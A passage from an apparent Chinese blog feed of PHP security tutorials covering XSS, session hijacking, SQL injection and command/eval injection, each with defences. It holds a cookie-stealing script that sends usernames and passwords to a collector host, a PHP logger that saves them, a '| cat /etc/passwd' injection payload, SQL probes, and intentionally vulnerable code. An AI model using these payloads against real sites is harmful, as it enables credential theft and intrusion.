<p>恶意用户会这么输入</p>
<p><img src="/images/PHP漏洞分析-跨站脚本XSS-03.png" alt="恶意输入" title="PHP漏洞分析-跨站脚本XSS-03"></p>
<p>我们看看<a href="http://test.com/hack.js里藏了什么" target="_blank" rel="external">http://test.com/hack.js里藏了什么</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var username=CookieHelper.getCookie(&apos;username&apos;).value;</div><div class="line">var password=CookieHelper.getCookie(&apos;password&apos;).value;</div><div class="line">var script =document.createElement(&apos;script&apos;);</div><div class="line">script.src=&apos;http://test.com/index.php?username=&apos;+username+&apos;&amp;password=&apos;+password;</div><div class="line">document.body.appendChild(script);</div></pre></td></tr></table></figure></p>
<p>几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向<a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
<p>发送了一个get请求</p>
<p><a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    if(!empty($_GET[&apos;password&apos;]))&#123;</div><div class="line">        $username=$_GET[&apos;username&apos;];</div><div class="line">        $password=$_GET[&apos;password&apos;];</div><div class="line">        </div><div class="line">        try&#123;</div><div class="line">            $path=$_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/password.txt&apos;;</div><div class="line">            $fp=fopen($path,&apos;a&apos;);</div><div class="line">            flock($fp, LOCK_EX);</div><div class="line">            fwrite($fp, &quot;$username\t $password\r\n&quot;);</div><div class="line">            flock($fp, LOCK_UN);</div><div class="line">            fclose($fp);</div><div class="line">        &#125;catch(Exception $e)&#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这样恶意用户就把访问留言板的用户的信息窃取了</p>
<h3 id="怎么预防"><a href="#怎么预防" class="headerlink" title="怎么预防"></a>怎么预防</h3><p>上面演示的是一个非常简单的XSS攻击，还有很多隐蔽的方式，但是其核心都是利用了脚本注入，因此我们解决办法其实很简单，不信赖用户输入，对特殊字符如”&lt;”,”&gt;”转义，就可以从根本上防止这一问题，当然很多解决方案都对XSS做了特定限制，如上面这中做法在ASP.NET中不幸不同，微软validateRequest对表单提交自动做了XSS验证。但防不胜防，总有些聪明的恶意用户会到我们的网站搞破坏，对自己站点不放心可以看看这个XSS跨站测试代码大全试试站点是否安全。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-Session会话劫持</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-Session%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-Session会话劫持/</id>
    <published>2018-03-24T00:06:48.000Z</published>
    <updated>2018-03-26T12:42:49.798Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>服务端和客户端之间是通过session(会话)来连接沟通。当客户端的浏览器连接到服务器后，服务器就会建立一个该用户的session。每个用户的session都是独立的，并且由服务器来维护。每个用户的session是由一个独特的字符串来识别，成为session id。用户发出请求时，所发送的http表头内包含session id 的值。服务器使用http表头内的session id来识别时哪个用户提交的请求。</p>
<p>session保存的是每个用户的个人数据，一般的web应用程序会使用session来保存通过验证的用户账号和密码。在转换不同的网页时，如果需要验证用户身份，就是用session内所保存的账号和密码来比较。session的生命周期从用户连上服务器后开始，在用户关掉浏览器或是注销时用户session_destroy函数删除session数据时结束。如果用户在20分钟内没有使用计算机的动作，session也会自动结束。</p>
<p>Session对于Web应用无疑是最重要的，也是最复杂的。对于web应用程序来说，加强安全性的第一条原则就是 – 不要信任来自客户端的数据，一定要进行数据验证以及过滤，才能在程序中使用，进而保存到数据层。 然而，为了维持来自同一个用户的不同请求之间的状态， 客户端必须要给服务器端发送一个唯一的身份标识符(Session ID)。 很显然，这和前面提到的安全原则是矛盾的，但是没有办法，http协议是无状态的，为了维持状态，我们别无选择。 可以看出，web应用程序中最脆弱的环节就是session，因为服务器端是通过来自客户端的一个身份标识来认证用户的， 所以session是web应用程序中最需要加强安全性的环节。　</p>
<p>同时，基于session的攻击有很多种方式。大部分的手段都是首先通过捕获合法用户的session, 然后冒充该用户来访问系统。也就是说，攻击者至少必须要获取到一个有效的session标识符，用于接下来的身份验证。</p>
<p>php处理session的应用架构:</p>
<p><img src="/images/PHP漏洞分析-Session会话劫持-01.jpeg" alt="Session架构" title="PHP漏洞分析-Session会话劫持-01"></p>
<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>会话劫持是指攻击者利用各种手段来获取目标用户的session id。一旦获取到session id，那么攻击者可以利用目标用户的身份来登录网站，获取目标用户的操作权限。</p>
<p>攻击者获取目标用户session id的方法:</p>
<p>1）暴力破解:尝试各种session id，直到破解为止。<br>2）计算:如果session id使用非随机的方式产生，那么就有可能计算出来<br>3）窃取:使用网络截获，xss攻击等方法获得</p>
<p>对于PHP来说，其内部Session的实现机制虽然不是很安全，但是关于生成Session ID的环节还是比较安全的，这个随机的Session ID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。</p>
<p>对于第三种方式大多使用网络数据通讯层进行攻击获取，可以使用SSL进行防御。</p>
<p>在应用层上也可以做出相应的防御措施：</p>
<p>目前有三种广泛使用的在Web环境中维护会话（传递Session ID）的方法：URL参数，隐藏域和Cookie。其中每一种都各有利弊，Cookie已经被证明是三种方法中最方便最安全的。从安全的观点，如果不是全部也是绝大多数针对基于Cookie的会话管理机制的攻击对于URL或是隐藏域机制同样适用，但是反过来却不一定，这就让Cookie成为从安全考虑的最佳选择。</p>
<p>会话劫持的攻击步骤:</p>
<p><img src="/images/PHP漏洞分析-Session会话劫持-02.jpeg" alt="劫持步骤" title="PHP漏洞分析-Session会话劫持-02"></p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li><p>更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。</p>
</li>
<li><p>关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。</p>
</li>
<li><p>设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。</p>
</li>
<li><p>关闭所有phpinfo类dump request信息的页面。</p>
</li>
<li><p>验证HTTP头部信息</p>
</li>
</ol>
<p>在http访问头文件：[Accept-Charset、Accept-Encoding、Accept-Language、User-Agent]，浏览器一般发出的头部不会改</p>
<p>使用User-Agent检测请求的一致性:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">GET/HTTP/1.1</div><div class="line">host:example.org</div><div class="line">User-Agent:Firefox/1.0</div><div class="line">Accept:text/html,image/png,image/jpeg,image/gif,*/*</div><div class="line">Cookie:PHPSESSID=1234</div><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">if(isset($_SESSION[&apos;HTTP_USER_AGENT&apos;]))&#123;    </div><div class="line">    if($_SESSION[&apos;HTTP_USER_AGENT&apos;]!=md5($_SERVER[&apos;HTTP_USER_AGENT&apos;]))&#123;</div><div class="line">                    /*Promptforpassword*/</div><div class="line">                   exit;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">else&#123;      </div><div class="line">　　$_SESSION[&apos;HTTP_USER_AGENT&apos;]=md5($_SERVER[&apos;HTTP_USER_AGENT&apos;]);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>确保User-Agent头部信息一致的确是有效的，如果会话标识通过cookie传递，攻击者能取得会话标识，他同时也能取得其它HTTP头部。由于cookie暴露与浏览器漏洞或跨站脚本漏洞相关，受害者需要访问攻击者的网站并暴露所有头部信息。则攻击者只需重建头部即可进行攻击了。</p>
<ol>
<li>加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;服务端和客户端之间是通过session(会话)来连接沟通。当客户端的浏览器连接到服务器后，服务器就会建立一个该用户的session。每个用户
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-SQL注入攻击</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-SQL注入攻击/</id>
    <published>2018-03-23T23:43:54.000Z</published>
    <updated>2018-03-24T03:11:29.812Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>所谓的SQL注入攻击，即一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据。</p>
<h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p>SQL注入攻击(SQL Injection)，是攻击者在表单中提交精心构造的sql语句，改动原来的sql语句，如果web程序没有对提交的数据经过检查，那么就会造成sql注入攻击。</p>
<p>SQL注入攻击的一般步骤:</p>
<ol>
<li><p>攻击者访问有SQL注入漏洞的站点，寻找注入点</p>
</li>
<li><p>攻击者构造注入语句，注入语句和程序中的SQL语句结合生成新的sql语句</p>
</li>
<li><p>新的sql语句被提交到数据库中执行 处理</p>
</li>
<li><p>数据库执行了新的SQL语句，引发SQL注入攻击</p>
</li>
</ol>
<p><img src="/images/PHP漏洞分析-SQL注入攻击-01.jpeg" alt="SQL注入攻击" title="PHP漏洞分析-SQL注入攻击-01"></p>
<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>来个初学者刚学PHP时通常会写的SQL语句，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$query = &quot;select * from postmessage where id = &quot;.$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$result = mysql_query($query)</div><div class="line"></div><div class="line">or die(&quot;执行ySQL查询语句失败：&quot; . mysql_error());</div></pre></td></tr></table></figure></p>
<p>如果用户的地址为 <a href="http://www.wduozhi.xyz/a.php?id=71" target="_blank" rel="external">http://www.wduozhi.xyz/a.php?id=71</a> and 1=1 和 <a href="http://www.wduozhi.xyz/a.php?id=71" target="_blank" rel="external">http://www.wduozhi.xyz/a.php?id=71</a> and 2=1,<br>参数id传递进来后，和前面的字符串结合的sql语句放入数据库执行 查询<br>提交 and 1=1，语句变成select <em> from postmessage where id = 71 and 1=1 这语句前值后值都为真，and以后也为真，返回查询到的数据<br>提交 and 1=2，语句变成select </em> from postmessage where id = 71 and 1=2 这语句前值为真，后值为假，and以后为假，查询不到任何数据<br>正常的SQL查询，经过我们构造的语句之后，形成了SQL注入攻击。通过这个注入点，我们还可以进一步拿到权限，比如说运用 union读取管理密码，读取数据库信息，或者用mysql的load_file，into outfile等函数进一步渗透。</p>
<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><h4 id="整型参数"><a href="#整型参数" class="headerlink" title="整型参数:"></a>整型参数:</h4><p>运用 intval函数将数据转换成整数</p>
<p>函数原型</p>
<p>int intval(mixed var, int base)</p>
<p>var是要转换成整形的变量</p>
<p>base，可选，是基础数，默认是10</p>
<h4 id="浮点型参数"><a href="#浮点型参数" class="headerlink" title="浮点型参数:"></a>浮点型参数:</h4><p>运用 floatval或doubleval函数分别转换单精度和双精度浮点型参数</p>
<p>函数原型</p>
<p>int floatval(mixed var)</p>
<pre><code>var是要转换的变量
</code></pre><p>int doubleval(mixed var)</p>
<pre><code>var是要转换的变量
</code></pre><h4 id="字符型参数"><a href="#字符型参数" class="headerlink" title="字符型参数:"></a>字符型参数:</h4><p>运用 addslashes函数来将单引号“’”转换成“\’”，双引号“””转换成“\””，反斜杠“\”转换成“\”，NULL字符加上反斜杠“\”</p>
<p>函数原型</p>
<p>string addslashes (string str)</p>
<pre><code>str是要检查的字符串
</code></pre><p>那么刚才出现的代码漏洞，我们可以这样修补<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">// 执行mysql查询语句</div><div class="line"></div><div class="line">$query = &quot;select * from postmessage where id = &quot;.intval($_GET[&quot;id&quot;]);</div><div class="line"></div><div class="line">$result = mysql_query($query)</div><div class="line"></div><div class="line">or die(&quot;执行ySQL查询语句失败：&quot; . mysql_error());</div></pre></td></tr></table></figure></p>
<p>如果是字符型，先判断magic_quotes_gpc能无法 为On,当不为On的时候运用 addslashes转义特殊字符。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(get_magic_quotes_gpc())&#123;  </div><div class="line">  　 $var = $_GET[&quot;var&quot;];  </div><div class="line">&#125;else&#123;  </div><div class="line">　   $var = addslashes($_GET[&quot;var&quot;]);  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="使用预编译语句，避免sql注入"><a href="#使用预编译语句，避免sql注入" class="headerlink" title="使用预编译语句，避免sql注入"></a>使用预编译语句，避免sql注入</h4><p>注入是早前很大的一个问题，不过近些年因为大家比较重视这个问题，所以慢慢变得好了很多。</p>
<p>吴翰清在web白帽子里说的很好，其实很多漏洞，像sql注入或xss，都是将“数据”和“代码”没有区分开。“代码”是程序员写的内容，“数据”是用户可以改变的内容。如果我们写一个sql语句<strong>select * from admin where username=’admin’ password=’xxxxx’</strong>, admin和xxxxx就是数据，是用户输入的用户名和密码，但如果没有任何处理，用户输入的就可能是“代码”，比如’or ‘’=’，这样就造成了漏洞。“代码”是绝对不能让用户接触的。</p>
<p>在php中，对于mysql数据库有两个模块，mysql和mysqli，mysqli的意思就是mysql improve。mysql的改进版，这个模块中就含有“预编译”这个概念。像上面那个sql语句，改一改<strong>：select * from admin where username=’?’ password=’?’</strong>，它就不是一个sql语句了，但是可以通过mysqli的预编译功能先把他编译成stmt对象，在后期用户输入账号密码后，用stmt-&gt;bind_param将用户输入的“数据”绑定到这两个问号的位置。这样，用户输入的内容就只能是“数据”，而不可能变成“代码”。</p>
<p>这两个问号限定了“数据”的位置，以及sql语句的结构。我们可以把我们所有的数据库操作都封装到一个类中，所有sql语句的执行都进行预编译。这样就完全避免了sql注入，这也是吴翰清最推荐的解决方案。</p>
<p>下面是使用mysqli的一些代码部分(所有的判断函数运行成功或失败的代码我都省略了，但不代表不重要)：</p>
<pre><code>&lt;?php
//用户输入的数据
$name = &apos;admin&apos;;
$pass = &apos;123456&apos;;
//首先新建mysqli对象,构造函数参数中包含了数据库相关内容。
$conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME, DB_PORT);
//设置sql语句默认编码
$this-&gt;mysqli-&gt;set_charset(&quot;utf8&quot;);
//创建一个使用通配符的sql语句
$sql = &apos;SELECT user_id FROM admin WHERE username=? AND password=?;&apos;;
//编译该语句，得到一个stmt对象.
$stmt = $conn-&gt;prepare($sql);
/********************之后的内容就能重复利用，不用再次编译*************************/
//用bind_param方法绑定数据
//大家可以看出来，因为我留了两个?，也就是要向其中绑定两个数据，所以第一个参数是绑定的数据的类型(s=string,i=integer)，第二个以后的参数是要绑定的数据
$stmt-&gt;bind_param(&apos;ss&apos;, $name, $pass);
//调用bind_param方法绑定结果（如果只是检查该用户与密码是否存在，或只是一个DML语句的时候，不用绑定结果）
//这个结果就是我select到的字段，有几个就要绑定几个
$stmt-&gt;bind_result($user_id);
//执行该语句
$stmt-&gt;execute();
//得到结果
if($stmt-&gt;fetch()){
    echo &apos;登陆成功&apos;;
    //一定要注意释放结果资源，否则后面会出错
    $stmt-&gt;free_result();
    return $user_id; //返回刚才select到的内容
}else{echo &apos;登录失败&apos;;}
?&gt;
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;所谓的SQL注入攻击，即一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-命令注入攻击</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-命令注入攻击/</id>
    <published>2018-03-23T22:58:53.000Z</published>
    <updated>2018-03-23T16:36:56.560Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Command Injection，即命令注入攻击，是指这样一种攻击手段，黑客通过把HTML代码输入一个输入机制(例如缺乏有效验证限制的表格域)来改变网页的动态生成的内容。使用系统命令是一项危险的操作，尤其在你试图使用远程数据来构造要执行的命令时更是如此。如果使用了被污染数据，命令注入漏洞就产生了。</p>
<h3 id="命令注入攻击"><a href="#命令注入攻击" class="headerlink" title="命令注入攻击"></a>命令注入攻击</h3><p>PHP中可以使用下列5个函数来执行外部的应用程序或函数</p>
<p>system、exec、passthru、shell_exec、“(与shell_exec功能相同)</p>
<p>函数原型</p>
<p><strong>string system(string command, int &amp;return_var)</strong></p>
<ul>
<li>command 要执行的命令</li>
<li>return_var 存放执行命令的执行后的状态值</li>
</ul>
<p><strong>string exec (string command, array &amp;output, int &amp;return_var)</strong></p>
<ul>
<li>command 要执行的命令</li>
<li>output 获得执行命令输出的每一行字符串</li>
<li>return_var 存放执行命令后的状态值</li>
</ul>
<p><strong>void passthru (string command, int &amp;return_var)</strong></p>
<ul>
<li>command 要执行的命令</li>
<li>return_var 存放执行命令后的状态值</li>
<li>string shell_exec (string command)</li>
<li>command 要执行的命令</li>
</ul>
<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$dir = $_GET[&quot;dir&quot;]; </div><div class="line">if (isset($dir))&#123; </div><div class="line">    echo &quot;&quot;; </div><div class="line">    system(&quot;ls -al &quot;.$dir); </div><div class="line">    echo &quot;&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>我们提交<a href="http://www.sectop.com/ex1.php?dir=|" target="_blank" rel="external">http://www.sectop.com/ex1.php?dir=|</a> cat /etc/passwd</p>
<p>提交以后，命令变成了 system(“ls -al | cat /etc/passwd”);</p>
<p><img src="/images/PHP漏洞分析-命令注入攻击-01.jpeg" alt="漏洞分析" title="PHP漏洞分析-命令注入攻击-01"></p>
<h3 id="eval注入攻击"><a href="#eval注入攻击" class="headerlink" title="eval注入攻击"></a>eval注入攻击</h3><p>eval函数将输入的字符串参数当作PHP程序代码来执行</p>
<p>函数原型:</p>
<p><strong>mixed eval(string code_str)</strong>         //eval注入一般发生在攻击者能控制输入的字符串的时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$var = &quot;var&quot;; </div><div class="line">if (isset($_GET[&quot;arg&quot;])) &#123; </div><div class="line">    $arg = $_GET[&quot;arg&quot;]; </div><div class="line">    eval(&quot;\$var = $arg;&quot;); </div><div class="line">    echo &quot;\$var =&quot;.$var; </div><div class="line">&#125; </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>当我们提交<a href="http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了" target="_blank" rel="external">http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了</a>.</p>
<h3 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">func A() &#123; </div><div class="line">    dosomething(); </div><div class="line">&#125; </div><div class="line"></div><div class="line">func B() &#123; </div><div class="line">    dosomething(); </div><div class="line">&#125; </div><div class="line">if (isset($_GET[&quot;func&quot;])) </div><div class="line">&#123; </div><div class="line">    $myfunc = $_GET[&quot;func&quot;]; </div><div class="line">    echo $myfunc(); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序员原意是想动态调用A和B函数，那我们提交<a href="http://www.sectop.com/ex.php?func=phpinfo漏洞产生" target="_blank" rel="external">http://www.sectop.com/ex.php?func=phpinfo漏洞产生</a>.</p>
<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><ol>
<li><p>尽量不要执行外部命令</p>
</li>
<li><p>使用自定义函数或函数库来替代外部命令的功能</p>
</li>
<li><p>使用escapeshellarg函数来处理命令参数</p>
</li>
<li><p>使用safe_mode_exec_dir指定可执行文件的路径</p>
</li>
</ol>
<p>esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“””，替换成“\””，分号“;”替换成“\;”</p>
<p>用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">safe_mode = On</div><div class="line">safe_mode_exec_dir = /usr/local/php/bin/</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Command Injection，即命令注入攻击，是指这样一种攻击手段，黑客通过把HTML代码输入一个输入机制(例如缺乏有效验证限制的表格
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|图片验证码</title>
    <link href="http://yoursite.com/2018/03/22/PHP-%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yoursite.com/2018/03/22/PHP-图片验证码/</id>
    <published>2018-03-21T22:00:11.000Z</published>
    <updated>2018-03-24T10:19:44.447Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。可以防止：恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。</p>
<p>这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p>
<h3 id="php图像处理简介"><a href="#php图像处理简介" class="headerlink" title="php图像处理简介"></a>php图像处理简介</h3><p>在PHP5中，动态图象的处理要比以前容易得多。PHP5在php.ini文件中包含了GD扩展包，只需去掉GD扩展包的相应注释就可以正常使用了。PHP5包含的GD库正是升级的GD2库，其中包含支持真彩图像处理的一些有用的JPG功能。</p>
<p>一般生成的图形，通过PHP的文档格式存放，但可以通过HTML的图片插入方式SRC来直接获取动态图形。比如，验证码、水印、微缩图等。</p>
<p>创建图像的一般流程：</p>
<ol>
<li>设定标头，告诉浏览器你要生成的MIME类型。</li>
<li>创建一个图像区域，以后的操作都将基于此图像区域。</li>
<li>在空白图像区域绘制填充背景。</li>
<li>在背景上绘制图形轮廓输入文本。</li>
<li>输出最终图形。</li>
<li>清除所有资源。</li>
<li>其他页面调用图像。</li>
</ol>
<p>简单实例代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    //第一步，设置文件MIME类型</div><div class="line">    header(&apos;Content-Type: image/png;&apos;);</div><div class="line">    </div><div class="line">    //第二步，创建一个图形区域，图像背景</div><div class="line">    $im = imagecreatetruecolor(200,200);</div><div class="line">    </div><div class="line">    //第三步，在空白图像区域绘制填充背景</div><div class="line">    $blue = imagecolorallocate($im,0,102,255);    </div><div class="line">    imagefill($im,0,0,$blue);</div><div class="line">    </div><div class="line">    //第四步，在蓝色的背景上输入一些线条，文字等</div><div class="line">    $white = imagecolorallocate($im,255,255,255);</div><div class="line">    imageline($im,0,0,200,200,$white);</div><div class="line">    imageline($im,200,0,0,200,$white);</div><div class="line">    imagestring($im,5,66,20,&apos;Jing.Whale&apos;,$white);</div><div class="line">    </div><div class="line">    //第五步，输出最终图形</div><div class="line">    imagepng($im);</div><div class="line">    </div><div class="line">    //第六步，我要将所有的资源全部清空</div><div class="line">    imagedestroy($im);    </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><h4 id="产生验证码"><a href="#产生验证码" class="headerlink" title="产生验证码"></a>产生验证码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function create_code($length = 4)&#123;</div><div class="line">	$string = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;;</div><div class="line">	$code = &quot;&quot;;</div><div class="line">	for($i=0;$i&lt;$length;$i++)&#123;</div><div class="line">		$pos = rand(0,35);</div><div class="line">		$code .= $string&#123;$pos&#125;;</div><div class="line">	&#125;</div><div class="line">	return $code;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="创建图片"><a href="#创建图片" class="headerlink" title="创建图片"></a>创建图片</h4><ul>
<li>创建一张简单的图片（80X20），设置背景色，文本色，再加一些干扰线，干扰素</li>
</ul>
